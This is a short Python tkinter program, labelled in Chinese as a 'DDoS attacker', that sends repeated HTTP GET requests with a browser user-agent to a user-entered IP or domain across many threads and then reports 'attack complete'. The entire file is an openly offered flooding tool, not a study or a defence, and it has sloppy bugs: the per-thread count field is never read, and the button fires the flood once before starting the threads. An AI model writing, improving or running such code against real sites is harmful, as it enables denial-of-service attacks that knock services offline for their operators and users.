import threading
from tkinter import *
from tkinter import messagebox
import requests

def gongji():
    num = 0
    try:
        num=int(ent2.get())
    except:
        messagebox.showerror("错误","请输入数字")

    headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0"}

    for i in range(num):
        requests.get(url=ent1.get(),headers=headers)

def gongji2():
    num = 0
    try:
        num = int(ent2.get())
    except:
        messagebox.showerror("错误", "请输入数字")
    list = []
    for i in range(num):
        list.append(threading.Thread(target=gongji))
        list[i].start()

    messagebox.showinfo("消息","攻击完成！")


root = Tk()
root.title("DDOS攻击器（余胜军徒儿开发）")
root.geometry("400x200")
root.resizable(False, False)
lab1 = Label(root, text="目标ip/域名:")
lab1.place(x=10,y=10)
ent1 = Entry(root)
ent1.place(x=90,y=10)
lab2 = Label(root, text="线程数（武力值）:")
lab2.place(x=10,y=40)
ent2 = Entry(root)
ent2.place(x=130,y=40)
lab3 = Label(root, text="每个线程攻击次数:")
lab3.place(x=10,y=70)
ent3 = Entry(root)
ent3.place(x=130,y=70)
but = Button(root,text="开始攻击", command=lambda :[gongji(), gongji2()])
but.place(x=170,y=130)
root.mainloop()